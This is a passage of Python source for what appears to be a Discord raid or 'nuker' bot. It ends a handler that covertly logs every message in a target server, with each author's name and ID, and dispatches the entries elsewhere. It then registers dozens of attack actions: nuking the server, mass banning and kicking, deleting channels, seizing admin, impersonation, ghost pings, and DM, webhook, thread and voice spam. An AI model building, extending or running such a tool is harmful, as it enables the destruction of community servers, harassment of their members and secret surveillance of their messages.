    if not _wh_logger_active:
        return
    if not message.guild or message.guild.id != _wh_logger_guild_id:
        return
    if message.author.bot:
        return
    entry = (f"**#{message.channel.name}** | **{message.author}** (`{message.author.id}`)\n"
             f"```{(message.content or '[no text]')[:1700]}```")
    await _dispatch_log(entry)

# --- Action registry ---
BotManager.ACTIONS = {
    "nuke": cmd_nuke,
    "auto_raid": cmd_auto_raid,
    "ban_all": cmd_ban_all,
    "kick_all": cmd_kick_all,
    "mute_all": cmd_mute_all,
    "unban_all": cmd_unban_all,
    "del_channels": cmd_delete_channels,
    "delete_channels": cmd_delete_channels,
    "del_emojis": cmd_delete_emojis,
    "delete_emojis": cmd_delete_emojis,
    "del_stickers": cmd_delete_stickers,
    "delete_stickers": cmd_delete_stickers,
    "create_channels": cmd_create_channels,
    "create_roles": cmd_create_roles,
    "create_cats": cmd_create_cats,
    "create_categories": cmd_create_cats,
    "rename_channels": cmd_rename_channels,
    "rename_roles": cmd_rename_roles,
    "edit_server": cmd_edit_server,
    "change_server": cmd_edit_server,
    "rename_members": cmd_rename_members,
    "nick_all": cmd_rename_members,
    "fix_nicks": cmd_fix_nicks,
    "dehoist_all": cmd_fix_nicks,
    "get_admin": cmd_get_admin,
    "impersonate": cmd_impersonate,
    "ghost_ping": cmd_ghost_ping,
    "ghost_ping_all": cmd_ghost_ping,
    "strip_roles": cmd_strip_roles,
    "remov_roles": cmd_strip_roles,
    "dm_all": cmd_dm_all,
    "message_all": cmd_dm_all,
    "dm_spam_user": cmd_dm_spam_user,
    "webhook_spam": cmd_webhook_spam,
    "server_info": cmd_server_info,
    "clone_server": cmd_clone_server,
    "webhook_logger": cmd_webhook_logger,
    "webhook_logs": cmd_webhook_logger,
    "lockdown": cmd_lockdown,
    "deafen_all": cmd_deafen_all,
    "sourdine_vc": cmd_deafen_all,
    "disconnect_all": cmd_disconnect_all,
    "kick_vc_all": cmd_disconnect_all,
    "mass_move": cmd_mass_move,
    "move_all_vc": cmd_mass_move,
    "invite_spam": cmd_invite_spam,
    "spam": cmd_spam,
    "spam_channel": cmd_spam,
    "thread_spam": cmd_thread_spam,
    "reaction_spam": cmd_reaction_spam,
    "vc_spam": cmd_vc_spam,
    "voice_spam": cmd_vc_spam,
    "spoiler_spam": cmd_spoiler_spam,
    "poll_spam": cmd_poll_spam,
    "event_spam": cmd_event_spam,
}
